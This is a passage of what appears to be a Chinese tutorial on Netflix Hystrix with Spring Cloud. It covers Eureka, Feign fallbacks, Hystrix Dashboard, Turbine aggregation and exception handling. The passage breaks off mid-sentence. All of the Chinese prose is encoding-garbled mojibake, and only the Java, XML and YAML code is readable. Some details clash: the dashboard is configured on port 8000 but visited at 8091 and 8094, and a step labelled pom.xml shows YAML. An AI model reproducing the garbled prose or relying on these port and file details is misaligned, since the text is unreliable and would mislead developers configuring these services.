å‡†å®æ—¶çš„è°ƒç”¨ç›‘æ§Hystrix é™¤äº†éš”ç¦»ä¾èµ–æœåŠ¡çš„è°ƒç”¨ä»¥å¤–ï¼Œè¿˜æä¾›äº†å‡†å®æ—¶çš„è°ƒç”¨ç›‘æ§ï¼ˆHystrix Dashboardï¼‰ã€‚Hystrix ä¼šæŒç»­åœ°è®°å½•æ‰€æœ‰é€šè¿‡ Hystrix å‘èµ·çš„è¯·æ±‚çš„æ‰§è¡Œä¿¡æ¯ï¼Œå¹¶ä»¥ç»Ÿè®¡æŠ¥è¡¨å’Œå›¾å½¢çš„å½¢å¼å±•ç¤ºç»™ç”¨æˆ·ï¼ŒåŒ…æ‹¬æ¯ç§’æ‰§è¡Œå¤šå°‘è¯·æ±‚ã€å¤šå°‘æˆåŠŸã€å¤šå°‘å¤±è´¥ç­‰ã€‚Netflix é€šè¿‡ hystrix-metrics-event-stream é¡¹ç›®å®ç°äº†å¯¹ä»¥ä¸ŠæŒ‡æ ‡çš„ç›‘æ§ï¼Œè€Œ Spring Cloud ä¹Ÿæä¾›äº† Hystrix Dashboard çš„æ•´åˆï¼Œå¯¹ç›‘æ§å†…å®¹è½¬åŒ–æˆå¯è§†åŒ–ç•Œé¢ã€‚ Hystrix å…¥é—¨æ¡ˆä¾‹1. ç‰ˆæœ¬è¯´æ˜åœ¨ä¸‹é¢çš„çš„æ•™ç¨‹ä¸­ï¼Œä½¿ç”¨çš„ Spring Cloud ç‰ˆæœ¬æ˜¯ Finchley.RELEASEï¼Œå¯¹åº”çš„ Spring Boot ç‰ˆæœ¬æ˜¯ 2.0.3ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç  2. åˆ›å»º Maven çˆ¶çº§ Pom å·¥ç¨‹åœ¨çˆ¶å·¥ç¨‹é‡Œé¢é…ç½®å¥½å·¥ç¨‹éœ€è¦çš„çˆ¶çº§ä¾èµ–ï¼Œç›®çš„æ˜¯ä¸ºäº†æ›´æ–¹ä¾¿ç®¡ç†ä¸ç®€åŒ–é…ç½®ï¼Œå…·ä½“ Maven é…ç½®å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- åˆ©ç”¨ä¼ é€’ä¾èµ–ï¼Œå…¬å…±éƒ¨åˆ† --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;!-- ç®¡ç†ä¾èµ– --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Finchley.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--æ³¨æ„ï¼šè¿™é‡Œéœ€è¦æ·»åŠ ä»¥ä¸‹é…ç½®ï¼Œå¦åˆ™å¯èƒ½ä¼šæœ‰å„ç§ä¾èµ–é—®é¢˜ --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt; 3. åˆ›å»º Eureka Server å·¥ç¨‹åˆ›å»º Eureka Server çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œéœ€è¦å¼•å…¥ spring-cloud-starter-netflix-eureka-server 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; åˆ›å»º Eureka Server çš„å¯åŠ¨ä¸»ç±»ï¼Œè¿™é‡Œæ·»åŠ ç›¸åº”æ³¨è§£ï¼Œä½œä¸ºç¨‹åºçš„å…¥å£ï¼š 12345678@SpringBootApplication@EnableEurekaServerpublic class EurekaServerApplication { public static void main(String[] args){ SpringApplication.run(EurekaServerApplication.class, args); }} æ·»åŠ  Eureka Server éœ€è¦çš„ application.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ä¸­ 1234567891011server: port: 8090eureka: instance: hostname: 127.0.0.1 client: registerWithEureka: false fetchRegistry: false serviceUrl: defaultZone: http://${eureka.instance.hostname}:${server.port}/eureka/ 4. åˆ›å»º Provider æºæœåŠ¡å·¥ç¨‹åˆ›å»º Provider çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œéœ€è¦å¼•å…¥ spring-cloud-starter-netflix-hystrixã€spring-cloud-starter-netflix-eureka-client 12345678910&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; åˆ›å»º Provider çš„å¯åŠ¨ä¸»ç±»ï¼Œæ·»åŠ æ³¨è§£ @EnableHystrixã€@EnableDiscoveryClient 123456789@EnableHystrix@SpringBootApplication@EnableDiscoveryClientpublic class ProviderApplication { public static void main(String[] args) { SpringApplication.run(ProviderApplication.class, args); }} åœ¨ application.yml æ–‡ä»¶ä¸­æŒ‡å®šæœåŠ¡åç§°ï¼ˆproviderï¼‰ã€æ³¨å†Œä¸­å¿ƒåœ°å€ä¸ç«¯å£å·ï¼š 12345678910111213server: port: 8080spring: application: name: providereureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true åˆ›å»ºç”¨äºæµ‹è¯•çš„ Controller ç±»ï¼š 123456789101112131415161718@RestController@RequestMapping("/user")public class UserController { @GetMapping("/getUser") @HystrixCommand(fallbackMethod = "defaultUser") public String getUser(String userName) { if (userName.equals("Jim")) { return "this is real user"; } else { throw new RuntimeException("user is not exist"); } } public String defaultUser(String userName) { return "the user not exist in this system"; }} 5. æµ‹è¯• å¯åŠ¨ Eureka Server ä¸ Provider åº”ç”¨ æµè§ˆå™¨è®¿é—® http://127.0.0.1:8080/user/getUser?userName=Jimï¼Œå½“ç”¨æˆ·åä¸º Jim æ—¶ä¼šè¿”å›æ­£ç¡®çš„ä¿¡æ¯ å½“ç”¨æˆ·åä¸ä¸º Jim æ—¶ï¼Œåˆ™ä¼šæŠ›å‡ºè¿è¡Œæ—¶å¼‚å¸¸ï¼ŒåŒæ—¶ Hystrix ä¼šé™çº§å¤„ç†è¿”å›å‹å¥½çš„æç¤º Hystrix å®æˆ˜åº”ç”¨Feign ä¸­ä½¿ç”¨ Hystrixåœ¨ Feign ä¸­ï¼Œé»˜è®¤æ˜¯è‡ªå¸¦ Hystrix åŠŸèƒ½çš„ï¼Œåœ¨å¾ˆè€çš„ç‰ˆæœ¬ä¸­é»˜è®¤æ˜¯æ‰“å¼€çš„ï¼Œä»æœ€è¿‘çš„å‡ ä¸ªç‰ˆæœ¬å¼€å§‹é»˜è®¤è¢«å…³é—­äº†ï¼Œå› æ­¤éœ€è¦é€šè¿‡é…ç½®æ–‡ä»¶æ‰“å¼€å®ƒï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ åœ¨ Provider æºæœåŠ¡å·¥ç¨‹é‡Œï¼Œåˆ›å»ºç”¨äºæµ‹è¯•çš„ Controller ç±»ï¼š 123456789@RestController@RequestMapping("/dept")public class DeptController { @RequestMapping("/getDept") public String getDept(String deptName) { throw new RuntimeException("dept is not exist"); }} åˆ›å»º Feign Client å·¥ç¨‹ï¼Œä½¿ç”¨ @FeignClient å®šä¹‰æ¥å£ï¼Œå¹¶é…ç½®é™çº§å›é€€ç±»ï¼š 123456@FeignClient(name = "PROVIDER", fallbackFactory = DeptClientFallbackServiceFactory.class)public interface DeptClientService { @RequestMapping("/dept/getDept") public String getDept(@RequestParam("deptName") String deptName);} åœ¨ Feign Client å·¥ç¨‹é‡Œï¼Œåˆ›å»ºé™çº§å›é€€ç±»ï¼Œå®ç° FallbackFactory æ¥å£ï¼š 1234567891011121314@Componentpublic class DeptClientFallbackServiceFactory implements FallbackFactory&lt;DeptClientService&gt; { @Override public DeptClientService create(Throwable throwable) { return new DeptClientService() { @Override public String getDept(String deptName) { return "the dept not exist in this system, please confirm deptName"; } }; }} åœ¨ Feign Client å·¥ç¨‹é‡Œï¼Œåˆ›å»ºå¯åŠ¨ä¸»ç±»ï¼š 123456789@EnableFeignClients@EnableDiscoveryClient@SpringBootApplicationpublic class FeignClientApplication { public static void main(String[] args) { SpringApplication.run(FeignClientApplication.class, args); }} åœ¨ Feign Client å·¥ç¨‹é‡Œï¼Œåˆ›å»ºç”¨äºæµ‹è¯•çš„ Controller ç±»ï¼š 123456789101112@RestController@RequestMapping("/dept")public class DeptController { @Autowired private DeptClientService clientService; @GetMapping("/get") public String get(String deptName) { return clientService.getDept(deptName); }} åœ¨ Feign Client å·¥ç¨‹é‡Œï¼Œé…ç½® pom.xml æ–‡ä»¶ï¼Œè®© Feign å¯ç”¨ Hystrixï¼š 1234567891011121314151617server: port: 8082spring: application: name: feign-clienteureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: truefeign: hystrix: enabled: true æµ‹è¯• Feign ä½¿ç”¨ Hystrix çš„æ•ˆæœï¼š å¯åŠ¨ Eureka Serverã€Provider åº”ç”¨ å½“è®¾ç½® feign.hystrix.enabled=false æ—¶ï¼Œå¯åŠ¨ Feign-Client åº”ç”¨ï¼Œè®¿é—® http://127.0.0.1:8082/dept/get?deptName=ITï¼ŒæœåŠ¡ç«¯è¿”å› 500 é”™è¯¯é¡µé¢ å½“è®¾ç½® feign.hystrix.enabled=true æ—¶ï¼Œå¯åŠ¨ Feign-Client åº”ç”¨ï¼Œè®¿é—® http://127.0.0.1:8082/dept/get?deptName=IT ï¼ŒæœåŠ¡ç«¯è¿”å› the dept not exist in this system, please confirm deptNameï¼Œè¿™æ—¶è¯´æ˜ Hystrix å·²ç»äº§ç”Ÿä½œç”¨ Hystrix DashboardHystrix Dashboard ä»ªè¡¨ç›˜æ˜¯æ ¹æ®ç³»ç»Ÿä¸€æ®µæ—¶é—´å†…å‘ç”Ÿçš„è¯·æ±‚æƒ…å†µæ¥å±•ç¤ºçš„å¯è§†åŒ–é¢æ¿ï¼Œè¿™äº›ä¿¡æ¯æ˜¯æ¯ä¸ª HystrixCommand æ‰§è¡Œè¿‡ç¨‹ä¸­çš„ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯æ˜¯ä¸€ä¸ªæŒ‡æ ‡é›†åˆå’Œå…·ä½“çš„ç³»ç»Ÿè¿è¡Œæƒ…å†µã€‚åˆ›å»º eureka-serverã€provider-serviceã€feign-client å·¥ç¨‹ï¼Œå…¶ä¸­ provider-service æä¾›äº†ä¸€ä¸ªæ¥å£è¿”å›ä¿¡æ¯ã€‚ç”±äº Hystrix çš„æŒ‡æ ‡æ˜¯éœ€è¦ç«¯å£è¿›è¡Œæ”¯æ’‘çš„ï¼Œå› æ­¤ provider-service å·¥ç¨‹éœ€è¦å¢åŠ  actuator ä¾èµ–ï¼Œå¹¶å…¬å¼€ hystrix.stream ç«¯ç‚¹ä»¥ä¾¿èƒ½è¢«è®¿é—®åˆ°ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ é…ç½® provider-service å·¥ç¨‹é‡Œçš„ pom.xmlï¼ŒåŠ å…¥ä»¥ä¸‹ä¾èµ–ï¼š 1234567891011121314&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; é…ç½® provider-service å·¥ç¨‹é‡Œçš„ application.ymlï¼Œå½“ Spring Cloud çš„ç‰ˆæœ¬é«˜äº Dalston æ—¶ï¼Œå»ºè®®ç¡®è®¤ management.endpoints.web.exposure.include åŒ…å«çš„æœ‰ hystrix.stream æˆ–è€…ç›´æ¥ä¸º *ï¼›å¦åˆ™è®¿é—® http://127.0.0.1:8080/actuator/hystrix.stream æ—¶å¯èƒ½ä¼šè¿”å› 404 é”™è¯¯é¡µé¢ 12345678910111213141516171819server: port: 8080spring: application: name: providereureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: truemanagement: endpoints: web: exposure: include: hystrix.stream åˆ›å»º hystrix-dashboard å·¥ç¨‹ï¼Œå¼•å…¥ spring-cloud-starter-netflix-hystrix-dashboard 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix-dashboard&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; åœ¨ hystrix-dashboard å·¥ç¨‹é‡Œï¼Œåˆ›å»ºå¯åŠ¨ä¸»ç±»ï¼Œæ·»åŠ  @EnableHystrixDashboard æ³¨è§£ï¼š 12345678@SpringBootApplication@EnableHystrixDashboardpublic class DashboardApplication { public static void main(String[] args) { SpringApplication.run(DashboardApplication.class, args); }} åœ¨ hystrix-dashboard å·¥ç¨‹é‡Œï¼Œæ·»åŠ  application.yml æ–‡ä»¶ 12server: port: 8000 æµ‹è¯• Hystrix Dashboard çš„è¿è¡Œæ•ˆæœï¼š åˆ†åˆ«å¯åŠ¨ eureka-serverã€provider-serviceã€feign-clientã€hystrix-dashboard åº”ç”¨ è®¿é—® Hystrix Dashboard çš„é¦–é¡µï¼šhttp://127.0.0.1:8091/hystrixï¼ŒæŸ¥çœ‹é¦–é¡µæˆªå›¾ æŸ¥çœ‹ provider-server åº”ç”¨çš„ç›‘æ§ä¿¡æ¯ï¼š http://127.0.0.1:8080/actuator/hystrix.streamï¼Œç›®å‰ Spring Cloud Finchley ç‰ˆçš„ SpringBoot ç‰ˆæœ¬æ˜¯ 2.0ï¼Œæ‰€ä»¥è®¿é—®è·¯å¾„éœ€è¦åŠ ä¸Š /actuatorï¼Œå¦åˆ™ä¼šè®¿é—®ä¸åˆ°ç›‘æ§é¡µé¢ï¼ŒæŸ¥çœ‹ç›‘æ§ä¿¡æ¯æˆªå›¾ åœ¨ Hystrix Dashboard çš„é¦–é¡µä¸­ï¼Œå¡«å†™ provider-server åº”ç”¨çš„ç›‘æ§åœ°å€ http://127.0.0.1:8080/actuator/hystrix.streamï¼Œç‚¹å‡» Monitor Stream æŒ‰é’®ï¼Œè·³è½¬åˆ°ç›‘æ§å›¾è¡¨é¡µé¢ï¼ŒæŸ¥çœ‹å›¾è¡¨é¡µé¢æˆªå›¾ è°ƒç”¨ feigh-client çš„æ¥å£ï¼šhttp://127.0.0.1:8082/dept/get?deptName=ITï¼Œæ›´æ¢ä¸åŒçš„ deptName å‚æ•°å€¼ï¼Œè§‚å¯Ÿ Hystrix Dashboard ç›‘æ§é¡µé¢ä¸Šçš„å›¾è¡¨å˜åŒ– Hystrix Dashboard å„é¡¹æŒ‡æ ‡å‚æ•°çš„å«ä¹‰ï¼š Turbine èšåˆ Hystrixä¸Šé¢è®²çš„æ˜¯å•ä¸ªå®ä¾‹çš„ Hystrix Dashboardï¼Œä½†åœ¨æ•´ä¸ªç³»ç»Ÿå’Œé›†ç¾¤çš„æƒ…å†µä¸‹ä¸æ˜¯ç‰¹åˆ«æœ‰ç”¨ï¼Œæ‰€ä»¥éœ€è¦ä¸€ç§æ–¹å¼æ¥èšåˆæ•´ä¸ªé›†ç¾¤ä¸‹çš„ç›‘æ§çŠ¶å†µï¼ŒTurbine å°±æ˜¯ç”¨æ¥èšåˆæ‰€æœ‰ç›¸å…³çš„ hystrix.stream æµçš„æ–¹æ¡ˆï¼Œç„¶ååœ¨ Hystrix Dashboard ä¸­æ˜¾ç¤ºï¼Œå…·ä½“åŸç†å¦‚ä¸‹å›¾ï¼š åˆ›å»º eureka-serverã€provider-service-userã€provider-service-deptã€hystrix-dashboard å·¥ç¨‹åï¼Œå†åˆ›å»º hystrix-turbine å·¥ç¨‹ï¼Œç”¨æ¥èšåˆé›†ç¾¤é‡Œçš„ hystrix.stream æµã€‚ä¸ºäº†å­¦ä¹ æ–¹ä¾¿ï¼Œä¹Ÿå¯ä»¥å°† hystrix-turbine å·¥ç¨‹æ•´åˆåˆ° hystrix-dashboard å·¥ç¨‹é‡Œï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ é…ç½® hystrix-turbine å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œç”±äº Turbine ä¾èµ– Eureka çš„æœåŠ¡æ³¨å†Œå‘ç°ï¼Œå› æ­¤éœ€è¦å¦å¤–å¼•å…¥ spring-cloud-starter-netflix-eureka-client 1234567891011121314&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-turbine&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; é…ç½® hystrix-turbine å·¥ç¨‹çš„ application.yml æ–‡ä»¶ï¼š 12345678910111213141516171819202122server: port: 8093spring: application: name: turbine-serviceeureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: trueturbine: aggregator: clusterConfig: default #æŒ‡å®šèšåˆå“ªäº›é›†ç¾¤ï¼Œå¤šä¸ªä½¿ç”¨","åˆ†å‰²ï¼Œé»˜è®¤ä¸ºdefaultã€‚å¯ä½¿ç”¨http://.../turbine.stream?cluster={clusterConfigä¹‹ä¸€}è®¿é—® appConfig: provider-dept,provider-user #é…ç½®Eurekaä¸­çš„serviceIdåˆ—è¡¨ï¼Œè¡¨æ˜ç›‘æ§å“ªäº›æœåŠ¡ clusterNameExpression: "\'default\'" # 1.å½“clusterNameExpression: defaultæ—¶ï¼Œturbine.aggregator.clusterConfigå¯ä»¥ä¸å†™ï¼Œå› ä¸ºé»˜è®¤å°±æ˜¯default # 2.å½“clusterNameExpressionæŒ‡å®šé›†ç¾¤åç§°ï¼Œé»˜è®¤è¡¨è¾¾å¼appNameï¼›æ­¤æ—¶ï¼šturbine.aggregator.clusterConfigéœ€è¦é…ç½®æƒ³è¦ç›‘æ§çš„åº”ç”¨åç§° # 3.å½“clusterNameExpression: metadata[\'cluster\']æ—¶ï¼Œå‡è®¾æƒ³è¦ç›‘æ§çš„åº”ç”¨é…ç½®äº†eureka.instance.metadata-map.cluster: ABCï¼Œåˆ™éœ€è¦é…ç½®ï¼ŒåŒæ—¶turbine.aggregator.clusterConfig: ABC åˆ›å»º hystrix-turbine å·¥ç¨‹é‡Œçš„å¯åŠ¨ä¸»ç±»ï¼Œæ·»åŠ  @EnableTurbine æ³¨è§£åï¼Œä¼šè‡ªåŠ¨å¯ç”¨ Eureka Clientï¼š 12345678@EnableTurbine@SpringBootApplicationpublic class TurbineApplication { public static void main(String[] args) { SpringApplication.run(TurbineApplication.class, args); }} æµ‹è¯• Turbine çš„è¿è¡Œæ•ˆæœï¼š åˆ†åˆ«å¯åŠ¨ eureka-serverã€provider-service-userã€provider-service-dept åº”ç”¨ å¯åŠ¨ hystrix-turbine åº”ç”¨ï¼Œè®¿é—® http://127.0.0.1:8093/turbine.streamï¼Œè§‚å¯Ÿæ˜¯å¦èƒ½è·å–åˆ°é›†ç¾¤ç›‘æ§ä¿¡æ¯ å¯åŠ¨ hystrix-dashboard åº”ç”¨ï¼Œè®¿é—® Hystrix Dashboard çš„é¦–é¡µ http://127.0.0.1:8094/hystrixï¼Œåœ¨é¡µé¢ä¸Šå¡«å†™ hystrix-turbine åº”ç”¨çš„ç›‘æ§åœ°å€ http://127.0.0.1:8093/turbine.streamï¼Œç„¶åç‚¹å‡» Monitor Stream æŒ‰é’®ï¼Œè·³è½¬åˆ°ç›‘æ§å›¾è¡¨é¡µé¢ï¼ŒæŸ¥çœ‹å›¾è¡¨é¡µé¢æˆªå›¾ åˆ†åˆ«è®¿é—® provider-service-user åº”ç”¨ï¼šhttp://127.0.0.1:8092/user/getUser?userName=Jimã€provider-service-dept åº”ç”¨ï¼šhttp://127.0.0.1:8091/dept/getDept?deptName=ITï¼Œè§‚å¯Ÿ Hystrix Dashboard ç›‘æ§é¡µé¢ä¸Šçš„å›¾è¡¨å˜åŒ– Hystrix è¿›é˜¶Hystrix é…ç½®è¯´æ˜Hystrix çš„é…ç½®æ¯”è¾ƒå¤šï¼Œå…·ä½“å¯ä»¥å‚è€ƒï¼šå®˜æ–¹è‹±æ–‡æ–‡æ¡£ï¼Œç¬¬ä¸‰æ–¹ä¸­æ–‡æ–‡æ¡£ Hystrix å‘½ä»¤æ³¨è§£çš„åŒºåˆ«Hystrix åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­é™¤äº† HystrixCommand è¿˜æœ‰ HystrixObservableCommandï¼Œè¿™ä¸¤ä¸ªå‘½ä»¤æœ‰å¾ˆå¤šå…±åŒç‚¹ï¼Œå¦‚éƒ½æ”¯æŒæ•…éšœå’Œå»¶è¿Ÿå®¹é”™ã€æ–­è·¯å™¨ã€æŒ‡æ ‡ç»Ÿè®¡ï¼Œä¸¤è€…çš„åŒºåˆ«å¦‚ä¸‹ï¼š HystrixCommand é»˜è®¤æ˜¯é˜»å¡å¼çš„ï¼Œå¯ä»¥æä¾›åŒæ­¥å’Œå¼‚æ­¥ä¸¤ç§æ–¹å¼ï¼Œä½† HystrixObservableCommand æ˜¯éé˜»å¡å¼çš„ï¼Œé»˜è®¤åªèƒ½æ˜¯å¼‚æ­¥çš„ HystrixCommand æ‰§è¡Œçš„æ–¹æ³•æ˜¯ runï¼ŒHystrixObservableCommand æ‰§è¡Œçš„æ˜¯ construct HystrixCommand ä¸€ä¸ªå®ä¾‹ä¸€æ¬¡åªèƒ½å‘ä¸€æ¡æ•°æ®å‡ºå»ï¼ŒHystrixObservableCommand å¯ä»¥å‘é€å¤šæ¡æ•°æ® Hystrix å¼‚å¸¸æœºåˆ¶å’Œå¤„ç†5 ç§ä¼šè¢« fallback æˆªè·çš„æƒ…å†µHystrix çš„å¼‚å¸¸å¤„ç†ä¸­ï¼Œæœ‰ 5 ç§å‡ºé”™çš„æƒ…å†µä¼šè¢« fallback æ‰€æˆªè·ï¼Œä»è€Œè§¦å‘ fallbackï¼Œè¿™äº›æƒ…å†µåˆ†åˆ«æ˜¯ï¼š æœ‰ä¸€ç§å¼‚å¸¸æ˜¯ä¸ä¼šè§¦å‘ fallback çš„ï¼Œä¸”ä¸ä¼šè¢«è®¡æ•°è¿›å…¥ç†”æ–­ï¼Œå®ƒæ˜¯ BAD_REQUESTï¼Œä¼šæŠ›å‡º HystrixBadRequestExceptionï¼Œè¿™ç§å¼‚å¸¸ä¸€èˆ¬å¯¹åº”çš„æ˜¯ç”±éæ³•å‚æ•°æˆ–è€…ä¸€äº›éç³»ç»Ÿå¼‚å¸¸å¼•èµ·çš„ï¼Œå¯¹äºè¿™ç§å¼‚å¸¸å¯ä»¥æ ¹æ®å“åº”åˆ›å»ºå¯¹åº”çš„å¼‚å¸¸è¿›è¡Œå¼‚å¸¸å°è£…æˆ–è€…ç›´æ¥å¤„ç†ã€‚ 1234567891011121314151617/** * HystrixBadRequestException ä¸ä¼šè§¦å‘ fallback */@RestController@RequestMapping("/user")public class UserController { @GetMapping("/getUser") @HystrixCommand(fallbackMethod = "defaultUser") public String getUser(String userName) { throw new HystrixBadRequestException("HystrixBadRequestException Error"); } public String defaultUser(String userName) { return "the user not exist in this system"; }} è·å– fallback é‡Œçš„å¼‚å¸¸ä¿¡æ¯è‹¥æƒ³åœ¨ @HystrixCommand é‡Œè·å–å¼‚å¸¸ä¿¡æ¯ï¼Œåªéœ€è¦åœ¨æ–¹æ³•å†…æŒ‡å®š Throwable å‚æ•°ï¼› 123456789101112131415@RestController@RequestMapping("/user")public class UserController { @GetMapping("/getUser") @HystrixCommand(fallbackMethod = "defaultUser") public String getUser(String userName) { throw new RuntimeException("the user not exist"); } public String defaultUser(String userName, Throwable throwable) { System.out.println(throwable.getMessage()); return "the user not exist in this system"; }} æˆ–è€…ç»§æ‰¿ @HystrixCommand çš„å‘½ä»¤ï¼Œé€šè¿‡æ–¹æ³•æ¥è·å–å¼‚å¸¸ï¼š 123456789101112131415161718192021222324252627282930@RestControllerpublic class ExceptionController { @GetMapping("/getPSFallbackOtherExpcetion") public String pSFallbackOtherExpcetion(){ String result = new PSFallbackOtherExpcetion().execute(); return result; }}/** * ç»§æ‰¿HystrixCommand */public class PSFallbackOtherExpcetion extends HystrixCommand&lt;String&gt;{ public PSFallbackOtherExpcetion() { super(HystrixCommandGroupKey.Factory.asKey("GroupOE")); } @Override protected String run() throws Exception { throw new Exception("this command will trigger fallback"); } @Override protected String getFallback() { System.out.println(getFailedExecutionException().getMessage()); return "invoke PSFallbackOtherExpcetion fallback method"; }} åœ¨ Feign Client ä¸­å¯ä»¥ç”¨ ErrorDecoder å®ç°å¯¹è¿™ç±»å¼‚å¸¸çš„åŒ…è£…ï¼Œåœ¨å®é™…çš„ä½¿ç”¨ä¸­ï¼Œå¾ˆå¤šæ—¶å€™è°ƒç”¨æ¥å£ä¼šæŠ›å‡ºè¿™äº› 400-500 ä¹‹é—´çš„é”™è¯¯ï¼Œæ­¤æ—¶å¯ä»¥é€šè¿‡å®ƒè¿›è¡Œå°è£…ï¼š 12345678910111213141516@Componentpublic class FeignErrorDecoder implements feign.codec.ErrorDecoder { @Override public Exception decode(String methodKey, Response response) { try { if (response.status() &gt;= 400 &amp;&amp; response.status() &lt;= 499) { String error = Util.toString(response.body().asReader()); return new HystrixBadRequestException(error); } } catch (IOException e) { System.out.println(e); } return feign.FeignException.errorStatus(methodKey, response); }} fallback ä¼šæŠ›å‡ºå¼‚å¸¸çš„æƒ…å†µ Hystrix è¯·æ±‚ç¼“å­˜Hystrix è¯·æ±‚ç¼“å­˜æ˜¯æŒ‡ Hystrix åœ¨åŒä¸€ä¸ªä¸Šä¸‹æ–‡è¯·æ±‚ä¸­ç¼“å­˜è¯·æ±‚ç»“æœï¼Œå®ƒä¸ä¼ ç»Ÿç†è§£çš„ç¼“å­˜æœ‰ä¸€å®šåŒºåˆ«ï¼›Hystrix çš„è¯·æ±‚ç¼“å­˜æ˜¯åœ¨åŒä¸€ä¸ªè¯·æ±‚ä¸­è¿›è¡Œï¼Œåœ¨è¿›è¡Œç¬¬ä¸€æ¬¡è°ƒç”¨ç»“æŸåå¯¹ç»“æœç¼“å­˜ï¼Œç„¶åæ¥ä¸‹æ¥åŒå‚æ•°çš„è¯·æ±‚å°†ä¼šä½¿ç”¨ç¬¬ä¸€æ¬¡ç¼“å­˜çš„ç»“æœï¼Œç¼“å­˜çš„ç”Ÿå‘½å‘¨æœŸåªåœ¨è¿™ä¸€æ¬¡è¯·æ±‚ä¸­æœ‰æ•ˆã€‚ä½¿ç”¨ HystrixCommand æœ‰ä¸¤ç§æ–¹å¼ï¼Œç¬¬ä¸€æ¬¡ç§æ˜¯ç»§æ‰¿ï¼Œç¬¬äºŒç§æ˜¯ç›´æ¥æ³¨è§£ï¼Œç¼“å­˜ä¹ŸåŒæ—¶æ”¯æŒè¿™ä¸¤ç§ä½¿ç”¨æ–¹å¼ã€‚å…·ä½“ä½¿ç”¨ä¾‹å­å¦‚ä¸‹ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ ä½¿ç”¨ç±»æ¥å¼€å¯ç¼“å­˜Hystrix çš„ç¼“å­˜æ˜¯åœ¨ä¸€æ¬¡è¯·æ±‚å†…æœ‰æ•ˆï¼Œè¿™è¦æ±‚è¯·æ±‚è¦åœ¨ä¸€ä¸ª Hystrix ä¸Šä¸‹æ–‡é‡Œï¼Œä¸ç„¶åœ¨ä½¿ç”¨ç¼“å­˜çš„æ—¶å€™ Hystrix 